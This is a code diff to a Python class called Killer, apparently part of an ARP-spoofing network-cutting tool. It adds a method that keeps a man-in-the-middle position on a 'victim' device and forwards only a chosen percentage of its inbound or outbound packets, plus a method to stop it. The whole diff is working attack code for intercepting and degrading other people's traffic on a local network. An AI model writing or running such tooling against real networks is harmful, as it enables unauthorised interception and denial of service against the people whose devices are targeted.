@@ -96,7 +96,48 @@ class Killer:
             return
         seq = self._next_op_seq(victim['mac'])
         self.killed[victim['mac']] = victim
+        self._stop_forwarder(victim['mac'])
         self._kill_arp_worker(victim, wait_after, seq)
+
+    def apply_percent_cut(self, victim, pass_percent=100, direction='both', debug=False):
+        """
+        Keep MITM active and forward only a percentage of packets.
+        """
+        if victim['mac'] not in self.killed:
+            self.kill(victim)
+        pass_percent = max(0, min(100, int(pass_percent)))
+        if direction == 'in':
+            pass_from_victim = 100
+            pass_to_victim = pass_percent
+        elif direction == 'out':
+            pass_from_victim = pass_percent
+            pass_to_victim = 100
+        else:
+            pass_from_victim = pass_percent
+            pass_to_victim = pass_percent
+
+        if victim['mac'] in self.forwarders:
+            self.forwarders[victim['mac']].stop()
+        if not self.router.get('mac'):
+            return
+        iface_to_use = self.iface.guid if hasattr(self.iface, 'guid') and self.iface.guid else self.iface.name
+        if not iface_to_use or iface_to_use == 'NULL':
+            return
+        fw = MitmForwarder(debug=debug)
+        fw.start(
+            victim=victim,
+            router=self.router,
+            iface_name=iface_to_use,
+            iface_mac=self.iface.mac,
+            drop_from_victim=False,
+            drop_to_victim=False,
+            pass_from_victim_pct=pass_from_victim,
+            pass_to_victim_pct=pass_to_victim,
+        )
+        self.forwarders[victim['mac']] = fw
+
+    def disable_percent_cut(self, mac):
+        self._stop_forwarder(mac)
 
     @threaded
     def _kill_arp_worker(self, victim, wait_after=2, seq=0):
